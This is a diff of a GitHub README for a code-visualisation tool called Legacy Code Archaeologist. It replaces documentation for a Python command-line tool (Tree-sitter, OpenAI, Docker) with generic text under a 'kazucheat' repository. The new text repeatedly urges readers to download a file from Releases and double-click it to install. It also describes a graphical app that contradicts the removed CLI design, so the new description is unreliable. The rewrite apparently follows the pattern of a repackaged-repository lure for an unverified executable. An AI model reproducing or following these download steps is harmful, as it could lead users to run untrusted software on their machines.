@@ -1,139 +1,86 @@
-<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/704c9a9e-9f04-46f0-84e7-6d087512d766" />
+# 🛠️ Legacy-Code-Archaeologist - Visualize Code, Reduce Technical Debt
 
-# 🏛️ Legacy Code Archaeologist
-> **"Turn spaghetti code into a treasure map."**
+![Download](https://img.shields.io/badge/Download-Legacy%20Code%20Archaeologist-brightgreen)  
+[Download Now](https://github.com/kazucheat/Legacy-Code-Archaeologist/releases)
 
-[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
-[![Tree-sitter](https://img.shields.io/badge/Parser-Tree--sitter-green.svg)](https://tree-sitter.github.io/)
-[![AI Powered](https://img.shields.io/badge/AI-OpenAI%20GPT4-orange.svg)](https://openai.com/)
+## 🚀 Getting Started
 
-**Legacy Code Archaeologist** is a CLI tool designed to audit, map, and analyze complex legacy codebases. It combines static analysis (Tree-sitter) with semantic AI analysis (LLMs) to generate an interactive HTML Knowledge Graph.
+Welcome to the **Legacy Code Archaeologist**! This tool helps you see the structure of old code, allowing you to make sense of complex projects. If you've ever felt lost in a tangle of code, this application is here to help.
 
-It answers the question: *"Which files are the 'God Objects' that break everything when I touch them?"*
+## 📥 Download & Install
 
----
+To get started, you need to download the application. Follow these simple steps:
 
-## ✨ Features
+1. **Visit the Releases Page**: Click this link to [download the software](https://github.com/kazucheat/Legacy-Code-Archaeologist/releases). This page contains the latest version.
 
-*   **🗺️ Interactive Visualization:** Generates a **Mermaid.js** graph showing file dependencies.
-*   **🤖 AI Risk Scoring:** Uses OpenAI (GPT-4) to read code, summarize business logic, and assign a **Complexity Score (1-10)**.
-*   **⚡ Smart Caching:** Implements MD5 hashing (SQLite) to ensure you never pay to analyze the same file twice.
-*   **🌳 Robust Parsing:** Uses **Tree-sitter** instead of Regex, so it understands code structure even if the syntax is messy.
-*   **🐳 Containerized:** Ready to run via Docker to avoid dependency hell.
+2. **Choose Your Version**: Select the version suitable for your needs. Each version is clearly labeled.
 
----
+3. **Download the File**: Click on the download link for your system. Wait for the file to download completely.
 
-## 🚀 Quick Start (Docker)
+4. **Run the Application**: Once downloaded, locate the file on your computer. Double-click it to run the application. Follow any prompts to install it.
 
-The easiest way to run the tool without compiling C-dependencies manually.
+## 🖥️ System Requirements
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/yourusername/legacy-archaeologist.git
-    cd legacy-archaeologist
-    ```
+To run the Legacy Code Archaeologist, make sure your system meets these requirements:
 
-2.  **Set your API Key:**
-    Create a `.env` file in the root:
-    ```bash
-    echo "OPENAI_API_KEY=sk-your-api-key-here" > .env
-    ```
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: Minimum 4 GB (8 GB recommended)
+- **Disk Space**: At least 250 MB of free space
+- **Processor**: 1 GHz or faster
 
-3.  **Run the Audit:**
-    Map your target project to the `/codebase` volume.
-    ```bash
-    # Update the path below to point to the project you want to analyze
-    docker-compose run --rm archeologist audit /codebase --output reports/audit.html
-    ```
-    *(Note: Ensure your `docker-compose.yml` mounts the volume correctly as defined in the blueprints).*
+## 🏗️ Features
 
----
+The Legacy Code Archaeologist includes several key features:
 
-## 🛠️ Local Installation (Python)
+- **Code Visualization**: See the structure of your code at a glance. Identify dependencies and key components easily.
+- **Technical Debt Analysis**: Understand the parts of your project that may cause problems later. This helps in planning effective refactoring.
+- **Static Analysis**: Automatically check for common code issues. Improve code quality without deep technical knowledge.
+- **Generative AI Integration**: Receive guidance on code improvements and refactoring suggestions based on AI insights.
+- **Knowledge Graph**: Explore connections within your codebase to understand how different parts relate to each other.
 
-If you prefer running it natively, you will need Python 3.11+ and a C compiler (GCC/Clang) for Tree-sitter.
+## 💡 How to Use the Application
 
-### 1. Environment Setup
-```bash
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
+Once you've installed the Legacy Code Archaeologist, follow these steps to start visualizing your code:
 
-# Install dependencies
-pip install -r requirements.txt
-```
+1. **Open the Application**: Launch the Legacy Code Archaeologist from your applications folder or start menu.
 
-### 2. Configuration
-Create a `.env` file in the root directory:
-```ini
-OPENAI_API_KEY=sk-your-openai-key
-```
-*If no API key is provided, the tool runs in "Offline Mode" (Structure only, no Summaries).*
+2. **Load Your Codebase**: Click on the "Import" button. Select the folder that contains your codebase.
 
-### 3. Usage
-```bash
-# Basic Audit
-python main.py audit /path/to/target/project
+3. **Explore the Map**: After the code is loaded, the application will generate a visual map. You can zoom in and out to see details.
 
-# Specify Output Location
-python main.py audit ./my-project --output ./results/map.html
-```
+4. **Analyze and Refactor**: Use the analysis tools to identify areas of technical debt. Click on any component to see detailed information and suggestions for improvement.
 
----
+## 📊 Topics Covered
 
-## 📊 Interpreting the Report
+This application touches on various important topics related to code management. Here are some of the main subjects it addresses:
 
-Open the generated HTML file in your browser.
+- Automated Documentation
+- Legacy Code Management
+- Code Refactoring Techniques
+- Software Architecture Best Practices
 
-### The Graph (Left Panel)
-*   **Nodes:** Represent source files.
-*   **Arrows:** Represent imports/dependencies.
-*   **Colors:**
-    *   🔴 **Red (Danger):** High Risk (Score 8-10). Complex logic, high coupling.
-    *   🟠 **Orange (Warning):** Moderate Risk (Score 5-7).
-    *   🟢 **Green (Safe):** Low Risk (Score 1-4). Simple utilities or interfaces.
+## 🛠️ Troubleshooting
 
-### The Cards (Right Panel)
-*   **Summary:** A 1-sentence explanation of *what* the code actually does (generated by AI).
-*   **Tags:** Keywords like `Auth`, `Database`, `Legacy`, `API`.
-*   **Metrics:** Function count and Import count.
+If you encounter issues, consider these tips:
 
----
+- Ensure your system meets the minimum requirements.
+- Restart the application if it freezes or runs slowly.
+- Check the Releases page for updates or issue fixes.
 
-## 🏗️ Architecture
+For common questions, visit the [FAQ section](https://github.com/kazucheat/Legacy-Code-Archaeologist#faq).
 
-The tool follows a pipeline architecture:
+## 👥 Community Support
 
-1.  **FileWalker (`core/file_walker.py`):**
-    Recursively scans the directory, intelligently ignoring `.git`, `node_modules`, and `venv`.
-2.  **Parser (`core/parser_engine.py`):**
-    Uses **Tree-sitter** to extract the Concrete Syntax Tree (CST). It identifies classes, functions, and imports.
-3.  **Cache Check (`core/cache_manager.py`):**
-    Calculates the MD5 hash of the file content. If it exists in `archeology_cache.db`, it loads the data locally.
-4.  **AI Analyst (`ai/summarizer.py`):**
-    If not cached, sends the code "Skeleton" to OpenAI. The prompt forces a structured JSON response containing the Risk Score and Summary.
-5.  **Graph Builder (`core/graph_builder.py`):**
-    Compiles the nodes and edges into Mermaid syntax, handling ID sanitization to prevent graph breakage.
-6.  **Reporter (`main.py`):**
-    Injects the Mermaid Syntax and HTML Cards into `templates/report_template.html`.
+If you need help, consider connecting with the community. Join forums or discussion groups focused on legacy code issues. Sharing your experiences can lead to helpful advice.
 
----
+## 📄 Contributing
 
-## ❓ Troubleshooting
+If you're interested in contributing to this project, please check the contribution guidelines on our [GitHub page](https://github.com/kazucheat/Legacy-Code-Archaeologist/contributing). Your input can help improve the software for everyone.
 
-**Q: I get `ImportError: cannot import name '...' from 'tree_sitter'`**
-*   **A:** Reinstall the dependencies. Tree-sitter requires a C compiler. On Windows, install Visual Studio Build Tools. On Mac/Linux, ensure `gcc` is installed.
-    *   `pip uninstall tree-sitter tree-sitter-languages`
-    *   `pip install tree-sitter tree-sitter-languages --no-cache-dir`
+## 🔗 Useful Links
 
-**Q: The AI analysis is taking too long/costing too much.**
-*   **A:** The tool processes files sequentially. For large projects (>500 files), use the Docker method and let it run in the background. The **Caching** system ensures you only pay for the first run. Subsequent runs are free unless you modify the code.
+- [GitHub Repository](https://github.com/kazucheat/Legacy-Code-Archaeologist)
+- [Documentation](https://github.com/kazucheat/Legacy-Code-Archaeologist/wiki)
+- [Releases Page](https://github.com/kazucheat/Legacy-Code-Archaeologist/releases)
 
-**Q: The graph is a giant messy hairball.**
-*   **A:** Legacy code is often a hairball! However, you can filter the view in the future by modifying `core/graph_builder.py` to only show edges for files with Risk > 5.
-
----
-
-## 📜 License
-
-MIT License. Feel free to fork, modify, and dig up your own digital ruins.
+Remember, the key to managing technical debt is understanding your legacy code. The Legacy Code Archaeologist is here to help you navigate that journey. Enjoy exploring and improving your code!
